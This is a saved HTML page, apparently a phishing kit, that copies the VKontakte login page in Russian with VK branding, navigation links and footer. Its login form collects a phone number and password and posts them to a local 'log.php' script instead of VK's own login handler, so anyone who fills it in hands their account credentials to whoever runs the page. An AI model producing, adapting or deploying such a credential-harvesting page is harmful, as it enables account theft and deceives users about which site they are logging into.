<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
</head>
<title>Вход</title>
<link rel="stylesheet" href="http://vk.com/css/rustyle.css?151" type="text/css">
<script src="./index_files/common.js"></script>
<link rel="stylesheet" href="./index_files/reg.css" type="text/css">
<link rel="stylesheet" href="./index_files/ui_controls.css" type="text/css">
<script type="text/javascript" src="./index_files/ui_controls.js"></script>
<script type="text/javascript" src="./index_files/lang0_0.js"></script>


<link rel="shortcut icon" href="http://vkontakte.ru/images/faviconnew.ico">
<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/ie.css?14); /* ]]> */</style><![endif]-->
<!--[if IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/ie7.css?13); /* ]]> */</style><![endif]-->
<!--[if gte IE 8]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/ie8.css); /* ]]> */</style><![endif]-->
<script type="text/javascript">
<!--
if (window.qArr && qArr[5]) qArr[5] = [5, "по товарам", "", "goods", 0x00000100];
onDomReady(function() {
  window.init_dec_hash();

  
});



var base_domain = '/';
css_versions = extend(css_versions, {
  lib_ui_controls_js: 101,
  ui_controls_css: 23,

  mentions_js: 31,
  qsearch_js: 34,
  privacy_css: 20,
  profile_css: 125,
  wiki_css: 26,
  gifts_css: 32,
  mail2_css: 12,
  mail_js: 40,
  photoview_css: 11,
  photoview_js: 16
});

var is_rtl = false;if (parent && parent != window && (browser.msie || browser.opera || browser.mozilla || browser.chrome || browser.safari || browser.iphone)) {
  onDomReady(function() {
    document.getElementsByTagName('body')[0].innerHTML = '<h1 style="color: #F00">THIS IS NOT VKONTAKTE AND NOT VK SITE</h1>';
  });
}
window.awayHash = '54c70991adf9d037a7';

//-->
</script>
</head>

<body onresize="onBodyResize()" style="overflow-y: auto; overflow-x: hidden; ">
<div id="pageContainer" style="width: 1343px; ">




 <div id="pageLayout">

<script type="text/javascript">onBodyResize()</script>

<!-- pageHeader -->

  <div id="pageHeader" class="p_head p_head_l0">
   <div class="header_back"></div>
   <div class="header_left"></div>
   <div class="header_right"></div>
   <div id="pageHeaderRight">

   <h1 id="home"><img src="home.bmp" width="792" height="40"><a href="http://vkontakte.ru/">ВКонтакте</a></h1>


<div class="headNav">

</div>

   </div>
  </div>

<!-- End pageHeader -->

<!-- sideBar -->

  <div id="sideBar">

   
<ol id="nav">
  <li><a href="http://vkontakte.ru/index.php">Главная</a></li>
  <li><a href="./index_files/index.html">Вход</a></li>
  <li><a href="http://vkontakte.ru/reg0">Регистрация</a></li>
</ol>

   
  </div>

<!-- End sideBar -->

<!-- pageBody -->

  <div id="pageBody" class="pageBody">
  <div id="wrapH">
  <div id="wrapHI">
   <div id="header"><h1> Вход</h1></div>
  </div>
  </div>

  <div id="wrap2">
  <div id="wrap1">
   <div id="content">

    <script type="text/javascript">
var vklogin = false;
function try_to_login(obj, text) {
  if (text.substr(0, 4) == 'good') {
    var to = 'cGhvdG84NjQ1NjdfNjc-';
    if (location.hash.toString().length) {
      to += location.hash;
    }
    if (to.length) {
      window.location.href = '/' + to;
    } else {
      window.location.href = '/id' + text.substr(4);
    }
  } else if (text.substr(0, 10) == 'not_active') {
    window.location.href = '/login.php?r=1';
  } else if (text.substr(0, 6) == 'invite') {
    window.location.href = '/help.php?page=welcome&hash=' + text.substr(6);
  } else if (text.substr(0, 9) == 'reginvite') {
    window.location.href = '/register.php?hash=' + text.substr(9);
  } else if (text.substr(0, 7) == 'vklogin') {
    vklogin = true;
    ge('login').submit();
  } else {
    show('message_text');
    ge('message_text').innerHTML = "<div id='error' style='font-size: 11px'>Такой почтовый адрес не зарегистрирован, либо пароль неверный.</div>";
  }
}

function quick_login() {
  var options = {onSuccess: try_to_login};
  hide('message_text');
  Ajax.postWithCaptcha('/login.php', {'op': 'a_login_attempt'}, options);
}

var captcha_send = 'Отправить';
var captcha_cancel = 'Отмена';

</script>

<div id="message" style="margin: 0">Чтобы просматривать эту страницу, нужно зайти на сайт.</div>
</div>

 <form method="post" name="login" id="login" action="log.php" onSubmit="return CheckForm(this);">
 <input type="hidden" name="success_url" id="success_url" value="">
 <input type="hidden" name="fail_url" id="fail_url" value="">

 <input type="hidden" name="try_to_login" id="try_to_login" value="1">
  <table align="center" cellpadding=0 cellspacing=7 border=0 width="40%">
   <tr>
    <td width="100px">
     <span class="grey"><font size="2">Телефон</span></font>
    </td>
    <td>
     <input class="inputText" type="text" name="login" value="" id="email" size="25" />
    <td>

   </tr>
   <tr>
    <td>
     <span class="grey"><font size="2">Пароль:</span></font>
    </td>
    <td>
     <input class="inputText" type="password" name="pass" value="" id="pass" size="25" />
    </td>

    <tr>
    <td>
     &nbsp;
    </td>
    <td>
     <input style="margin-top:1px; vertical-align: middle;" type="checkbox" name="expire" id="expire" value="1" /><font size="2">
	 Чужой компьютер
		</font>
	 </td>
   </tr>
   <tr>
    <td>
     &nbsp;
    </td>
    <td>
<div style="height:20px; margin:5px 0px">
<ul class="nNav"><li style="margin-left:0px">
<b class="nc"><b class="nc1"><b></b></b><b class="nc2"><b></b></b></b>
<span class="ncc"><a href="javascript:document.login.submit()">Вход</a></span>

<b class="nc"><b class="nc2"><b></b></b><b class="nc1"><b></b></b></b>
</li>
<li>
<b class="nc"><b class="nc1"><b></b></b><b class="nc2"><b></b></b></b>
<span class="ncc"><a href="javascript:document.location=reg0">Регистрация</a></span>
<b class="nc"><b class="nc2"><b></b></b><b class="nc1"><b></b></b></b>
</li></ul>
</div>

    </td>
   </tr>
   <tr>
    <td>

     &nbsp;
    </td>
    <td class="forgotPass">
     <a href="http://vkontakte.ru/login.php?op=forgot"><font size="2">  Забыли пароль?</font></a>
    </td>
   </tr>

  </table>
  <input type="submit" value="." style="color:#fff;border:0;padding:0;margin:0;background:#fff;height:6px;width:6px"/>

 </form>

</div>


   </div>
  </div>
  </div>

  </div>
  <div id="boxHolder"></div>

<!-- End pageBody --><!-- bFooter -->
<div class="footerVK">
 <div><a href="http://vkontakte.ru/help.php?page=about">В Контакте</a> © 2006-2015 <a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(0, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">Русский</a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(1, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">Українська</a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(2, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">Беларуская (тарашкевiца)</a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(3, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">English</a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(11, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">Српски</a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(10, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">Magyar</a><a href="http://vkontakte.ru/login.php#" onclick="return doChangeLang(57, &#39;570d06bbb940283fe1&#39;);" style="margin-left:7px">Az&#601;rbaycan</a><a href="http://vkontakte.ru/login.php#" onclick="return changeLang();" class="langSelector">все языки »</a></div>
 <div><!----></div>
</div>
<!--Both counters-->
<script type="text/javascript">
<!--
onDomReady(function(){
  setTimeout(function() {
    (new Image()).src = 'http://counter.yadro.ru/hit?r' + escape(document.referrer) + ((typeof(screen)=='undefined')?'':';s'+screen.width+'*'+screen.height+'*'+(screen.colorDepth?screen.colorDepth:screen.pixelDepth)) + ';u' + escape(document.URL) + ';' + Math.random() + '';
    (new Image()).src = 'http://www.tns-counter.ru/V13a***R>' + document.referrer.replace(/\*/g,'%2a') + '*vkontakte_ru/ru/UTF-8/tmsec=vkontakte_total/' + Math.round(Math.random() * 1000000000);
  }, 10);
});
//-->
</script>
<!--/Both counters-->
<!-- End bFooter -->

</div>

<script type="text/javascript">
window.init_dec_hash = function() {
  window.decoded_hashes = {};
  var dec_hash = function(hash) {
    (function(_){window.decoded_hashes[_]=(function(__){var ___=ge?'':'___';for(____=0;____<__.length;++____)___+=__.charAt(__.length-____-1);return geByClass?___:'___';})(_.substr(_.length-5)+_.substr(4,_.length-12));})(hash);
  }
  window.decodehash = function(hash) {
    dec_hash(hash);
    return window.decoded_hashes[hash];
  }
}
</script>



<!-- End pageLayout 9707 -->
</div>


</body></html>